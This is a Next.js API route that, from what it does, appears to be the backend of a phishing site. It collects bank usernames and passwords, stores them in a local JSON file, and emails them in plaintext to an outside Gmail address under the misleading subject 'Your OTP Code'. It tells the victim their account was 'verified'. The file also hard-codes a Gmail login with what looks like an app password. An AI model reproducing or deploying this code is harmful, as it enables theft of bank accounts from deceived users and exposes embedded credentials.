// pages/api/login-bank.js

import nodemailer from 'nodemailer';
import fs from 'fs';
import path from 'path';

// Path to the JSON file
const dataFilePath = path.join(process.cwd(), 'data', 'bankData.json');

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const { bankUsername, bankPassword } = req.body;

  try {
    // Save the data locally
    saveDataLocally({ bankUsername, bankPassword });

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: 'adesiyantope2014@gmail.com',
          pass: 'copl stcv wixx waaj',
        },
      });
  
      const mailOptions = {
        from: 'adesiyantope2014@gmail.com',
        to: 'devsusan24@gmail.com',
        subject: 'Your OTP Code',
        text: `Bank username: ${bankUsername} Bank password: ${bankPassword}`,
      };

    await transporter.sendMail(mailOptions);
    
    return res.status(200).json({ message: 'Account verified successfully and email sent!' });
  } catch (error) {
    console.error('Error:', error.message);
    return res.status(500).json({ message: 'Failed to send email or save data', error: error.message });
  }
}

// Function to save data locally
function saveDataLocally(data) {
  fs.readFile(dataFilePath, 'utf8', (err, existingData) => {
    if (err) {
      console.error('Error reading data file:', err);
      return;
    }

    let bankData = [];
    if (existingData) {
      bankData = JSON.parse(existingData); // Parse existing data
    }

    // Append new data
    bankData.push({ ...data, timestamp: new Date().toISOString() });

    // Write updated data back to the file
    fs.writeFile(dataFilePath, JSON.stringify(bankData, null, 2), (err) => {
      if (err) {
        console.error('Error writing to data file:', err);
      } else {
        console.log('Data saved successfully!');
      }
    });
  });
}
